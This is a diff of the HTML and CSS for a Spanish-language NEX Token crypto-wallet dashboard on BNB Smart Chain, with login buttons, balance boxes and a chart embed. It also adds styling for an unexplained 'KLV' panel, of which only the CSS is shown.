@@ -1,1574 +1,1812 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Bienvenido a NEX Token, el ecosistema descentralizado oficial en la red BNB Smart Chain. Administra tu portafolio, conecta tu billetera Web3 y opera de forma rápida y segura.">
-    <title>NEX Token - Ecosistema Descentralizado</title>
-    
-    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4729162767039305" crossorigin="anonymous"></script>
-    <link rel="icon" href="https://i.postimg.cc/cHk815mV/image-0.jpg" type="image/png">
-    
-    <!-- Librería Ethers.js para conectar con la Blockchain BNB -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" type="text/javascript"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Bienvenido a NEX Token, el ecosistema descentralizado oficial en la red BNB Smart Chain. Administra tu portafolio, conecta tu billetera Web3 y opera de forma rápida y segura.">
+<title>Token NEX - Ecosistema Descentralizado</title>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4729162767039305" crossorigin="anonymous"></script>
+<link rel="icon" href="https://i.postimg.cc/cHk815mV/image-0.jpg" type="image/png">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" type="text/javascript"></script>
+<style>
+:root{--bg-dark:#090d16;--card-bg:#111827;--border-color:#1f2937;--primary-cyan:#38bdf8;--primary-gold:#f59e0b;--green-up:#10b981;--red-down:#ef4444;--text-main:#f9fafb;--text-muted:#9ca3af;--main-font:'Segoe UI',system-ui,-apple-system,sans-serif;--container-max-width:1200px}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background-color:var(--bg-dark);color:var(--text-main);font-family:var(--main-font);min-height:100vh;padding:16px;padding-top:70px}
+.top-bar{position:fixed;top:0;left:0;right:0;height:55px;background:rgba(17,24,39,.98);backdrop-filter:blur(8px);border-bottom:1px solid var(--border-color);display:flex;align-items:center;justify-content:space-between;padding:0 16px;z-index:1000}
+.user-info-bar{font-size:13px;color:var(--primary-cyan);font-weight:bold;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:180px}
+.top-actions{display:flex;gap:8px;align-items:center}
+.btn-top{background:rgba(255,255,255,.08);border:1px solid var(--border-color);color:var(--text-main);padding:6px 12px;border-radius:6px;font-size:12px;font-weight:bold;cursor:pointer;transition:background .3s}
+.btn-top:hover{background:rgba(255,255,255,.15)}
+.btn-auth{background:var(--primary-cyan);color:#000;border:none;padding:6px 12px;border-radius:6px;font-weight:bold;font-size:12px;cursor:pointer;transition:background .3s}
+.btn-provider{width:100%;padding:10px;margin-top:8px;border-radius:6px;border:1px solid var(--border-color);font-weight:bold;font-size:13px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px}
+.btn-google{background:#fff;color:#000}
+.btn-apple{background:#000;color:#fff;border-color:#333}
+.container{max-width:var(--container-max-width);margin:0 auto;display:grid;grid-template-columns:1fr;gap:20px}
+@media(min-width:768px){.container{grid-template-columns:2fr 1fr}}
+.card{background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:16px;padding:20px;box-shadow:0 4px 20px rgba(0,0,0,.3);margin-bottom:20px}
+.welcome-card{max-width:450px;margin:40px auto;text-align:center}
+.welcome-card h2{color:var(--primary-cyan);margin-bottom:10px}
+.welcome-card p{color:var(--text-muted);font-size:14px;margin-bottom:20px}
+.stat-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:15px}
+.stat-box{background:var(--bg-dark);padding:12px;border-radius:8px;border:1px solid var(--border-color);position:relative}
+.stat-box span{font-size:12px;color:var(--text-muted)}
+.stat-box h4{font-size:17px;color:var(--text-main);margin-top:4px;font-variant-numeric:tabular-nums;overflow-wrap:anywhere}
+.stat-box .balance-detail{display:block;margin-top:5px;font-size:10px;color:var(--text-muted);line-height:1.4}
+.selector-de-moneda{background:var(--card-bg);border:1px solid var(--border-color);color:var(--primary-cyan);font-size:11px;font-weight:bold;padding:3px 6px;border-radius:4px;cursor:pointer;outline:none;margin-top:4px;width:100%}
+.btn-action{width:100%;padding:12px;margin-top:10px;border:none;border-radius:8px;font-weight:bold;font-size:15px;cursor:pointer}
+.btn-buy{background-color:var(--green-up);color:#fff;display:none!important}
+.btn-sell{background-color:var(--red-down);color:#fff;display:none!important}
+.btn-send{background-color:#f59e0b;color:#000}
+#bannedScreen{display:none;position:fixed;inset:0;background:#000;z-index:9999;flex-direction:column;align-items:center;justify-content:center;color:var(--red-down);text-align:center;padding:20px}
+.web3-btn{display:block;margin-top:10px;font-size:14px}
+.dynamic-banner{position:relative;width:100%;max-width:var(--container-max-width);margin:0 auto 20px auto;display:none;border-radius:12px;overflow:hidden;border:1px solid var(--border-color)}
+.dynamic-banner img{width:100%;display:block;max-height:250px;object-fit:cover}
+.banner-overlay-text{position:absolute;top:50%;left:0;width:100%;transform:translateY(-50%);text-align:center;font-size:24px;font-weight:900;text-shadow:2px 2px 8px rgba(0,0,0,.8);pointer-events:none;white-space:nowrap}
+.moving-text{animation:slideText 10s linear infinite}
+@keyframes slideText{0%{transform:translate(100%,-50%)}100%{transform:translate(-100%,-50%)}}
+.modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:2000;align-items:center;justify-content:center}
+.modal.show{display:flex!important}
+.modal-content{background:var(--card-bg);padding:24px;border-radius:12px;width:90%;max-width:500px;border:1px solid var(--border-color);max-height:90vh;overflow-y:auto}
+.modal-content h3{color:var(--primary-cyan);margin-bottom:15px}
+.field{margin-bottom:12px}
+.field label{display:block;font-size:12px;color:var(--text-muted);margin-bottom:4px}
+.field input,.field select{width:100%;padding:10px;background:var(--bg-dark);border:1px solid var(--border-color);color:var(--text-main);border-radius:6px}
+.btn-gen{background:var(--border-color);color:var(--primary-cyan);border:1px solid var(--primary-cyan);padding:6px;font-size:11px;border-radius:4px;cursor:pointer;margin-top:4px}
+.quote-box{background:var(--bg-dark);border:1px dashed var(--primary-cyan);padding:12px;border-radius:8px;margin:12px 0;font-size:13px;line-height:1.6}
+.wallet-option-btn{width:100%;padding:14px;margin-top:10px;border-radius:10px;border:1px solid var(--border-color);font-weight:bold;font-size:15px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:12px;transition:transform .2s,background .2s}
+.wallet-option-btn:active{transform:scale(.98)}
+.btn-metamask-choice{background:#e2761b;color:#fff}
+.btn-trust-choice{background:#0500ff;color:#fff}
+.historial-item{background:var(--bg-dark);padding:10px;border-radius:6px;border:1px solid var(--border-color);margin-bottom:8px;display:flex;justify-content:space-between;align-items:center}
+.historial-tipo{font-weight:bold;font-size:12px}
+.tipo-compra{color:var(--green-up)}
+.tipo-venta{color:var(--red-down)}
+.tipo-envio{color:var(--primary-gold)}
+.chat-box{background:var(--bg-dark);border:1px solid var(--border-color);border-radius:8px;height:250px;overflow-y:auto;padding:10px;display:flex;flex-direction:column;gap:8px;margin-bottom:10px}
+.chat-msg{max-width:80%;padding:8px 12px;border-radius:8px;font-size:13px;line-height:1.4}
+.msg-user{align-self:flex-end;background:var(--primary-cyan);color:#000;font-weight:500}
+.msg-admin{align-self:flex-start;background:var(--border-color);color:#fff}
+.chat-input-container{display:flex;gap:8px}
+.chat-input-container input{flex:1;padding:8px;background:var(--bg-dark);border:1px solid var(--border-color);color:#fff;border-radius:6px}
+.admin-tabs{display:flex;gap:5px;margin-bottom:15px;overflow-x:auto;padding-bottom:5px}
+.tab-btn{background:var(--bg-dark);color:var(--text-muted);border:1px solid var(--border-color);padding:8px 12px;border-radius:6px;cursor:pointer;font-size:12px;font-weight:bold;white-space:nowrap}
+.tab-btn.active{background:var(--primary-cyan);color:#000;border-color:var(--primary-cyan)}
+.tab-content{display:none}
+.tab-content.active{display:block}
+.admin-user-card{background:var(--bg-dark);padding:10px;border-radius:6px;border:1px solid var(--border-color);margin-bottom:8px;display:flex;justify-content:space-between;align-items:center}
+.chart-container{position:relative;margin-top:15px;height:500px;width:100%;border-radius:12px;overflow:hidden;background:#090d16;border:1px solid var(--border-color)}
+.chart-container iframe{width:100%;height:100%;border:none}
 
-    <style>
-        :root {
-            --bg-dark: #090d16;
-            --card-bg: #111827;
-            --border-color: #1f2937;
-            --primary-cyan: #38bdf8;
-            --primary-gold: #f59e0b;
-            --green-up: #10b981;
-            --red-down: #ef4444;
-            --text-main: #f9fafb;
-            --text-muted: #9ca3af;
-            --main-font: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            --container-max-width: 1200px;
-        }
-
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { 
-            background-color: var(--bg-dark); 
-            color: var(--text-main); 
-            font-family: var(--main-font); 
-            min-height: 100vh; 
-            padding: 16px; 
-            padding-top: 70px; 
-        }
-
-        .top-bar { 
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            right: 0; 
-            height: 55px; 
-            background-color: rgba(17, 24, 39, 0.98); 
-            backdrop-filter: blur(8px); 
-            border-bottom: 1px solid var(--border-color); 
-            display: flex; 
-            align-items: center; 
-            justify-content: space-between; 
-            padding: 0 16px; 
-            z-index: 1000; 
-        }
-        .user-info-bar { 
-            font-size: 13px; 
-            color: var(--primary-cyan); 
-            font-weight: bold; 
-            white-space: nowrap; 
-            overflow: hidden; 
-            text-overflow: ellipsis; 
-            max-width: 180px; 
-        }
-        .top-actions { display: flex; gap: 8px; align-items: center; }
-        
-        .btn-top { 
-            background: rgba(255, 255, 255, 0.08); 
-            border: 1px solid var(--border-color); 
-            color: var(--text-main); 
-            padding: 6px 12px; 
-            border-radius: 6px; 
-            font-size: 12px; 
-            font-weight: bold; 
-            cursor: pointer; 
-            transition: background 0.3s;
-        }
-        .btn-top:hover { background: rgba(255, 255, 255, 0.15); }
-
-        .btn-auth { 
-            background: var(--primary-cyan); 
-            color: #000; 
-            border: none; 
-            padding: 6px 12px; 
-            border-radius: 6px; 
-            font-weight: bold; 
-            font-size: 12px; 
-            cursor: pointer; 
-            transition: background 0.3s; 
-        }
-        .btn-provider { 
-            width: 100%; 
-            padding: 10px; 
-            margin-top: 8px; 
-            border-radius: 6px; 
-            border: 1px solid var(--border-color); 
-            font-weight: bold; 
-            font-size: 13px; 
-            cursor: pointer; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            gap: 10px; 
-        }
-        .btn-google { background: #ffffff; color: #000000; }
-        .btn-apple { background: #000000; color: #ffffff; border-color: #333; }
-
-        .container { 
-            max-width: var(--container-max-width); 
-            margin: 0 auto; 
-            display: grid; 
-            grid-template-columns: 1fr; 
-            gap: 20px; 
-        }
-        @media (min-width: 768px) { 
-            .container { grid-template-columns: 2fr 1fr; } 
-        }
-
-        .card { 
-            background-color: var(--card-bg); 
-            border: 1px solid var(--border-color); 
-            border-radius: 16px; 
-            padding: 20px; 
-            box-shadow: 0 4px 20px rgba(0,0,0,0.3); 
-            margin-bottom: 20px; 
-        }
-
-        .welcome-card { max-width: 450px; margin: 40px auto; text-align: center; }
-        .welcome-card h2 { color: var(--primary-cyan); margin-bottom: 10px; }
-        .welcome-card p { color: var(--text-muted); font-size: 14px; margin-bottom: 20px; }
-
-        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
-        .stat-box { 
-            background: var(--bg-dark); 
-            padding: 12px; 
-            border-radius: 8px; 
-            border: 1px solid var(--border-color); 
-            position: relative; 
-        }
-        .stat-box span { font-size: 12px; color: var(--text-muted); }
-        .stat-box h4 { font-size: 17px; color: var(--text-main); margin-top: 4px; }
-
-        .currency-selector {
-            background: var(--card-bg);
-            border: 1px solid var(--border-color);
-            color: var(--primary-cyan);
-            font-size: 11px;
-            font-weight: bold;
-            padding: 3px 6px;
-            border-radius: 4px;
-            cursor: pointer;
-            outline: none;
-            margin-top: 4px;
-            width: 100%;
-        }
-
-        .btn-action { 
-            width: 100%; 
-            padding: 12px; 
-            margin-top: 10px; 
-            border: none; 
-            border-radius: 8px; 
-            font-weight: bold; 
-            font-size: 15px; 
-            cursor: pointer; 
-        }
-        .btn-buy { background-color: var(--green-up); color: #fff; display: none !important; }
-        .btn-sell { background-color: var(--red-down); color: #fff; display: none !important; }
-        .btn-send { background-color: #f59e0b; color: #000; }
-
-        #bannedScreen { 
-            display: none; 
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 100%; 
-            background: #000; 
-            z-index: 9999; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            color: var(--red-down); 
-            text-align: center; 
-            padding: 20px; 
-        } 
-        
-        .web3-btn { display: block; margin-top: 10px; font-size: 14px; }
-
-        .dynamic-banner { 
-            position: relative; 
-            width: 100%; 
-            max-width: var(--container-max-width); 
-            margin: 0 auto 20px auto; 
-            display: none; 
-            border-radius: 12px; 
-            overflow: hidden; 
-            border: 1px solid var(--border-color); 
-        }
-        .dynamic-banner img { width: 100%; display: block; max-height: 250px; object-fit: cover; }
-        .banner-overlay-text { 
-            position: absolute; 
-            top: 50%; 
-            left: 0; 
-            width: 100%; 
-            transform: translateY(-50%); 
-            text-align: center; 
-            font-size: 24px; 
-            font-weight: 900; 
-            text-shadow: 2px 2px 8px rgba(0,0,0,0.8); 
-            pointer-events: none; 
-            white-space: nowrap; 
-        }
-        .moving-text { animation: slideText 10s linear infinite; }
-        @keyframes slideText { 0% { transform: translate(100%, -50%); } 100% { transform: translate(-100%, -50%); } }
-
-        .modal { 
-            display: none; 
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 100%; 
-            background: rgba(0,0,0,0.85); 
-            z-index: 2000; 
-            align-items: center; 
-            justify-content: center; 
-        }
-        .modal.show { display: flex !important; }
-        .modal-content { 
-            background: var(--card-bg); 
-            padding: 24px; 
-            border-radius: 12px; 
-            width: 90%; 
-            max-width: 500px; 
-            border: 1px solid var(--border-color); 
-            max-height: 90vh; 
-            overflow-y: auto; 
-        }
-        .modal-content h3 { color: var(--primary-cyan); margin-bottom: 15px; }
-        .field { margin-bottom: 12px; }
-        .field label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 4px; }
-        .field input, .field select { 
-            width: 100%; 
-            padding: 10px; 
-            background: var(--bg-dark); 
-            border: 1px solid var(--border-color); 
-            color: var(--text-main); 
-            border-radius: 6px; 
-        }
-        .btn-gen { 
-            background: var(--border-color); 
-            color: var(--primary-cyan); 
-            border: 1px solid var(--primary-cyan); 
-            padding: 6px; 
-            font-size: 11px; 
-            border-radius: 4px; 
-            cursor: pointer; 
-            margin-top: 4px; 
-        }
-
-        .quote-box {
-            background: var(--bg-dark);
-            border: 1px dashed var(--primary-cyan);
-            padding: 12px;
-            border-radius: 8px;
-            margin: 12px 0;
-            font-size: 13px;
-            line-height: 1.6;
-        }
-
-        .wallet-option-btn { 
-            width: 100%; 
-            padding: 14px; 
-            margin-top: 10px; 
-            border-radius: 10px; 
-            border: 1px solid var(--border-color); 
-            font-weight: bold; 
-            font-size: 15px; 
-            cursor: pointer; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            gap: 12px; 
-            transition: transform 0.2s, background 0.2s; 
-        }
-        .wallet-option-btn:active { transform: scale(0.98); }
-        .btn-metamask-choice { background: #e2761b; color: #ffffff; }
-        .btn-trust-choice { background: #0500ff; color: #ffffff; }
-
-        .historial-item { 
-            background: var(--bg-dark); 
-            padding: 10px; 
-            border-radius: 6px; 
-            border: 1px solid var(--border-color); 
-            margin-bottom: 8px; 
-            display: flex; 
-            justify-content: space-between; 
-            align-items: center; 
-        }
-        .historial-tipo { font-weight: bold; font-size: 12px; }
-        .tipo-compra { color: var(--green-up); }
-        .tipo-venta { color: var(--red-down); }
-        .tipo-envio { color: var(--primary-gold); }
-
-        .chat-box { 
-            background: var(--bg-dark); 
-            border: 1px solid var(--border-color); 
-            border-radius: 8px; 
-            height: 250px; 
-            overflow-y: auto; 
-            padding: 10px; 
-            display: flex; 
-            flex-direction: column; 
-            gap: 8px; 
-            margin-bottom: 10px; 
-        }
-        .chat-msg { max-width: 80%; padding: 8px 12px; border-radius: 8px; font-size: 13px; line-height: 1.4; }
-        .msg-user { align-self: flex-end; background: var(--primary-cyan); color: #000; font-weight: 500; }
-        .msg-admin { align-self: flex-start; background: var(--border-color); color: #fff; }
-        .chat-input-container { display: flex; gap: 8px; }
-        .chat-input-container input { flex: 1; padding: 8px; background: var(--bg-dark); border: 1px solid var(--border-color); color: white; border-radius: 6px; }
-
-        .admin-tabs { display: flex; gap: 5px; margin-bottom: 15px; overflow-x: auto; padding-bottom: 5px; }
-        .tab-btn { 
-            background: var(--bg-dark); 
-            color: var(--text-muted); 
-            border: 1px solid var(--border-color); 
-            padding: 8px 12px; 
-            border-radius: 6px; 
-            cursor: pointer; 
-            font-size: 12px; 
-            font-weight: bold; 
-            white-space: nowrap; 
-        }
-        .tab-btn.active { background: var(--primary-cyan); color: #000; border-color: var(--primary-cyan); }
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
-        
-        .admin-user-card { 
-            background: var(--bg-dark); 
-            padding: 10px; 
-            border-radius: 6px; 
-            border: 1px solid var(--border-color); 
-            margin-bottom: 8px; 
-            display: flex; 
-            justify-content: space-between; 
-            align-items: center; 
-        }
-
-        .chart-container { 
-            position: relative; 
-            margin-top: 15px; 
-            height: 500px; 
-            width: 100%; 
-            border-radius: 12px; 
-            overflow: hidden; 
-            background: #090d16; 
-            border: 1px solid var(--border-color); 
-        }
-        .chart-container iframe { width: 100%; height: 100%; border: none; }
-    </style>
+/* ===== MODO KLV ===== */
+.tab-btn.klv{border-color:#39ff88;color:#39ff88}
+.tab-btn.klv.active{background:#39ff88;color:#03130a;border-color:#39ff88}
+.klv-launch{width:100%;padding:16px;border:1px solid #39ff88;border-radius:10px;background:#04120a;color:#39ff88;font:800 14px ui-monospace,monospace;letter-spacing:2px;cursor:pointer;text-transform:uppercase;transition:.2s}
+.klv-launch:hover{background:#39ff88;color:#03130a;box-shadow:0 0 24px rgba(57,255,136,.4)}
+.klv-list{font-size:12px;color:var(--text-muted);line-height:1.75;margin-top:12px;padding-left:18px}
+#klvPanel{position:fixed;inset:0;z-index:100000;display:none;flex-direction:column;color:#c7d6d0;font:13px/1.55 ui-monospace,SFMono-Regular,Menlo,monospace;background:radial-gradient(circle at 12% 0%,#0a1a12 0,transparent 45%),radial-gradient(circle at 88% 100%,#0a141c 0,transparent 45%),#04070a}
+#klvPanel.on{display:flex}
+.klv-top{display:flex;align-items:center;gap:12px;padding:12px 16px;border-bottom:1px solid #1d3a2c;background:#050b08;flex-wrap:wrap}
+.klv-top b{color:#39ff88;letter-spacing:3px;font-size:13px}
+.klv-sub{color:#5d7a70;font-size:9px;letter-spacing:2px;text-transform:uppercase}
+.klv-blink{width:9px;height:16px;background:#39ff88;animation:klvbl 1s steps(1) infinite}
+@keyframes klvbl{50%{opacity:0}}
+.klv-x{margin-left:auto;background:#1a0d0d;border:1px solid #5c1a1a;color:#ff4d5e;padding:7px 13px;border-radius:6px;cursor:pointer;font:700 11px ui-monospace,monospace;letter-spacing:1px}
+.klv-x:hover{background:#ff4d5e;color:#1a0d0d}
+.klv-nav{display:flex;gap:4px;padding:9px 12px;border-bottom:1px solid #123;overflow-x:auto;background:#04090c}
+.klv-tab{background:#070f0c;border:1px solid #123;color:#5d7a70;padding:7px 12px;border-radius:6px;cursor:pointer;font:700 10.5px ui-monospace,monospace;letter-spacing:1px;white-space:nowrap}
+.klv-tab:hover{color:#39ff88}
+.klv-tab.on{background:#39ff88;color:#03130a;border-color:#39ff88}
+.klv-main{flex:1;overflow:auto;padding:14px;width:100%;max-width:1150px;margin:0 auto}
+.klv-pane{display:none}
+.klv-pane.on{display:block}
+.klv-card{background:#070d12;border:1px solid #123;border-radius:9px;padding:13px;margin-bottom:12px}
+.klv-card h4{margin:0 0 9px;font-size:10.5px;letter-spacing:2px;color:#39ff88;text-transform:uppercase;border-left:2px solid #39ff88;padding-left:8px}
+#klvPanel input,#klvPanel select,#klvPanel textarea{background:#050c09;border:1px solid #123;color:#c7d6d0;padding:9px 11px;border-radius:6px;font:12px ui-monospace,monospace;width:100%}
+#klvPanel textarea{min-height:150px;resize:vertical;line-height:1.5}
+#klvPanel input:focus,#klvPanel textarea:focus{outline:none;border-color:#39ff88}
+.klv-row{display:flex;gap:8px;flex-wrap:wrap}
+.klv-b{background:#0a1d14;border:1px solid #1d3a2c;color:#39ff88;padding:8px 14px;border-radius:6px;cursor:pointer;font:700 10.5px ui-monospace,monospace;letter-spacing:1.2px;text-transform:uppercase;flex:0 0 auto}
+.klv-b:hover{background:#39ff88;color:#03130a}
+.klv-b.g{background:#0a0f0c;border-color:#123;color:#5d7a70}
+.klv-b.g:hover{color:#c7d6d0;background:#111a16}
+.klv-pre{background:#03080a;border:1px solid #123;border-radius:7px;padding:10px;margin:9px 0 0;max-height:400px;overflow:auto;font-size:11.5px;white-space:pre-wrap;word-break:break-all;color:#9fbdb2}
+.klv-hint{color:#5d7a70;font-size:11px;margin:8px 0 0}
+.klv-warn{color:#ffc857;font-size:11px;margin:8px 0 0}
+.klv-f{display:flex;gap:9px;padding:7px;border-bottom:1px solid #0d1611;font-size:11.5px;align-items:flex-start}
+.klv-f:last-child{border:0}
+.klv-f .ln{color:#5d7a70;min-width:34px;text-align:right;flex:0 0 auto}
+.klv-f .ms{flex:1;min-width:0}
+.klv-f code{display:block;color:#7fb39f;margin-top:3px;font-size:11px;word-break:break-all}
+.klv-tag{display:inline-block;padding:2px 6px;border-radius:4px;font-size:9.5px;font-weight:700;letter-spacing:1px}
+.tc{background:#3a0a12;color:#ff4d5e;border:1px solid #6b1522}
+.th{background:#3a2205;color:#ffc857;border:1px solid #6b4010}
+.tm{background:#0a2434;color:#5cc8ff;border:1px solid #14425c}
+.tl{background:#111a16;color:#5d7a70;border:1px solid #1d3a2c}
+.klv-score{font:800 28px ui-monospace,monospace;line-height:1}
+.klv-stat{display:inline-block;margin-right:14px;font-size:11px;color:#5d7a70}
+.klv-stat b{color:#c7d6d0}
+.klv-pay{border:1px solid #123;border-radius:7px;margin-bottom:8px;overflow:hidden;background:#060d0a}
+.klv-pay summary{padding:9px 11px;cursor:pointer;color:#39ff88;font-size:11px;letter-spacing:1px;font-weight:700}
+.klv-pay pre{margin:0;border:0;border-top:1px solid #123;padding:10px;max-height:320px;overflow:auto;font-size:11.5px;white-space:pre-wrap;color:#9fbdb2}
+</style>
 </head>
 <body>
 
-    <div class="top-bar">
-        <div id="userDisplay" class="user-info-bar">Invitado</div>
-        
-        <div class="top-actions">
-            <button class="btn-top" id="helpBtn" onclick="abrirHelpModal()" style="display: none;">💬 Soporte</button>
-            <button class="btn-top" id="authBtn" onclick="abrirAuthModal()">Ingresar</button>
-            <button class="btn-top" id="btnLogoutTop" style="display: none;" onclick="ejecutarCerrarSesion()" title="Cerrar Sesión">🚪 Salir</button>
-            <button class="btn-top" onclick="abrirLoginAdminModal()" title="Acceso Admin" style="padding: 6px 10px;">⋮</button>
+<div class="top-bar">
+    <div id="userDisplay" class="user-info-bar">Invitado</div>
+    <div class="top-actions">
+        <button class="btn-top" id="helpBtn" onclick="abrirHelpModal()" style="display:none;">💬 Soporte</button>
+        <button class="btn-top" id="authBtn" onclick="abrirAuthModal()">Ingresar</button>
+        <button class="btn-top" id="btnLogoutTop" style="display:none;" onclick="ejecutarCerrarSesion()" title="Cerrar Sesión">🚪 Salir</button>
+        <button class="btn-top" onclick="abrirLoginAdminModal()" title="Acceso Admin" style="padding:6px 10px;">⋮</button>
+    </div>
+</div>
+
+<div id="welcomeSection" class="card welcome-card">
+    <h2>Bienvenido al token NEX</h2>
+    <p>Inicia sesión o crea tu cuenta para acceder a tu portafolio y operar dentro del ecosistema.</p>
+    <button class="btn-provider btn-google" id="btnGoogleWelcome" onclick="ejecutarLoginGoogle()">Continuar con Google</button>
+    <button class="btn-provider btn-apple" id="btnAppleWelcome" onclick="ejecutarLoginApple()">Continuar con Apple</button>
+    <button class="btn-auth" style="width:100%;padding:10px;margin-top:10px;background:var(--border-color);color:#fff;" onclick="abrirAuthModal()">Iniciar con Correo</button>
+</div>
+
+<div id="appContent" style="display:none;">
+    <div id="walletWarningBanner" style="background:rgba(245,158,11,.15);border:1px solid var(--primary-gold);padding:12px 16px;border-radius:10px;margin-bottom:20px;display:flex;align-items:center;gap:10px;">
+        <span style="font-size:20px;">⚠️</span>
+        <div>
+            <strong style="color:var(--primary-gold);font-size:13px;display:block;">Aviso Importante:</strong>
+            <span style="font-size:12px;color:var(--text-muted);">Debes conectar una billetera (MetaMask o Trust Wallet) para que todas las funciones de la página operen correctamente.</span>
         </div>
     </div>
 
-    <div id="welcomeSection" class="card welcome-card">
-        <h2>Bienvenido al token NEX</h2>
-        <p>Inicia sesión o crea tu cuenta para acceder a tu portafolio y operar dentro del ecosistema.</p>
-
-        <button class="btn-provider btn-google" id="btnGoogleWelcome" onclick="ejecutarLoginGoogle()">Continuar con Google</button>
-        <button class="btn-provider btn-apple" id="btnAppleWelcome" onclick="ejecutarLoginApple()">Continuar con Apple</button>
-        
-        <button class="btn-auth" style="width: 100%; padding: 10px; margin-top:10px; background: var(--border-color); color: white;" onclick="abrirAuthModal()">Iniciar con Correo</button>
+    <div id="bannerTopContainer" class="dynamic-banner">
+        <img id="bannerTopImg" src="" alt="Promoción NEX">
+        <div id="bannerTopText" class="banner-overlay-text"></div>
     </div>
 
-    <div id="appContent" style="display: none;">
-        
-        <div id="walletWarningBanner" style="background: rgba(245, 158, 11, 0.15); border: 1px solid var(--primary-gold); padding: 12px 16px; border-radius: 10px; margin-bottom: 20px; display: flex; align-items: center; gap: 10px;">
-            <span style="font-size: 20px;">⚠️</span>
-            <div>
-                <strong style="color: var(--primary-gold); font-size: 13px; display: block;">Aviso Importante:</strong>
-                <span style="font-size: 12px; color: var(--text-muted);">Debes conectar una billetera (MetaMask o Trust Wallet) para que todas las funciones de la página operen correctamente.</span>
-            </div>
-        </div>
-
-        <div id="bannerTopContainer" class="dynamic-banner">
-            <img id="bannerTopImg" src="" alt="Promoción NEX">
-            <div id="bannerTopText" class="banner-overlay-text"></div>
-        </div>
-
-        <div class="container">
-            <div class="card" id="userDashboard">
-                
-                <div style="display: flex; justify-content: space-between; align-items: center;">
-                    <h3>Mi Portafolio NEX</h3>
+    <div class="container">
+        <div class="card" id="userDashboard">
+            <div style="display:flex;justify-content:space-between;align-items:center;"><h3>Mi Portafolio NEX</h3></div>
+            <div class="stat-grid">
+                <div class="stat-box">
+                    <span>Saldo NEX</span>
+                    <h4 id="userTokens" aria-live="polite">Conecta la billetera</h4>
+                    <input type="hidden" id="currencySelect" value="USD">
                 </div>
-
-                <div class="stat-grid">
-                    <div class="stat-box">
-                        <span>Balance Tokens NEX</span>
-                        <h4 id="userTokens">0.00 NEX</h4>
-                        <input type="hidden" id="currencySelect" value="USD">
-                    </div>
-
-                    <div class="stat-box">
-                        <span>Variación (24h)</span>
-                        <h4 id="userProfit" style="color: var(--green-up);">0.00%</h4>
-                    </div>
+                <div class="stat-box">
+                    <span>Cambio de precio NEX (24 h)</span>
+                    <h4 id="userProfit" aria-live="polite">—</h4>
+                    <span class="balance-detail">Cambio de mercado, sin ganancia personal.</span>
                 </div>
-
-                <div id="realTradeSection" style="margin-top: 15px; display: block;">
-                    <button class="btn-action web3-btn" style="background: #1fc7d4; color: white; border: none; font-weight: bold;" onclick="abrirModalCanjear()">
-                        🔄 Canjear / Comprar NEX
-                    </button>
-                    <button class="btn-action btn-send" onclick="abrirModalEnviarTokens()">
-                        📤 Enviar Tokens a Otra Billetera
-                    </button>
-                    <button class="btn-action web3-btn" style="background: #f3ba2f; color: #000; border: none; font-weight: bold;" onclick="abrirWalletChoiceModal()">
-                        🦊 Conectar con MetaMask o Trust Wallet
-                    </button>
+                <div class="stat-box">
+                    <span>Saldo real de USDT</span>
+                    <h4 id="userUsdtBalance" aria-live="polite">Conecta la billetera</h4>
+                    <span class="balance-detail" id="userUsdtBalanceNote">Saldo en BNB Smart Chain; actualiza cada 30 s</span>
                 </div>
-
-                <div style="margin-top: 25px; border-top: 1px solid var(--border-color); padding-top: 15px;">
-                    <div style="display: flex; justify-content: space-between; align-items: center;">
-                        <h4 style="color: var(--text-main); font-size: 14px;">📜 Historial On-Chain Real</h4>
-                        <button class="btn-gen" style="padding: 4px 8px;" onclick="toggleHistorial()">Mostrar / Ocultar</button>
-                    </div>
-                    <div id="historialLista" style="display: none; margin-top: 10px; font-size: 13px; max-height: 250px; overflow-y: auto;">
-                        <p style="color: var(--text-muted); text-align: center;">Conecta tu billetera para cargar transacciones reales.</p>
-                    </div>
+                <div class="stat-box">
+                    <span>Saldo real de BNB</span>
+                    <h4 id="userBnbBalance" aria-live="polite">Conecta la billetera</h4>
+                    <span class="balance-detail" id="userBnbBalanceNote">Saldo en BNB Smart Chain; actualiza cada 30 s</span>
                 </div>
             </div>
-
-            <div class="card">
-                <h2>Mercado NEX Token ($NEX)</h2>
-                <h1 id="tokenPrice" style="font-size: 2.2rem; margin-top: 10px;">Cargando...</h1>
-                <p style="font-size: 13px; color: var(--text-muted); margin-top: 5px;">
-                    Red: <strong id="tokenNet" style="color: #38bdf8;">BNB Smart Chain (Mainnet)</strong>
-                </p>
-                
-                <div class="chart-container">
-                    <iframe 
-                        id="geckoterminal-embed" 
-                        title="GeckoTerminal NEX Chart" 
-                        src="https://www.geckoterminal.com/bsc/tokens/0x44B1c3Cd218D73368AD865C1cf8bd6E1Dd15c59A?embed=1&info=0&swaps=0&grayscale=0&light_chart=0" 
-                        allow="clipboard-write" 
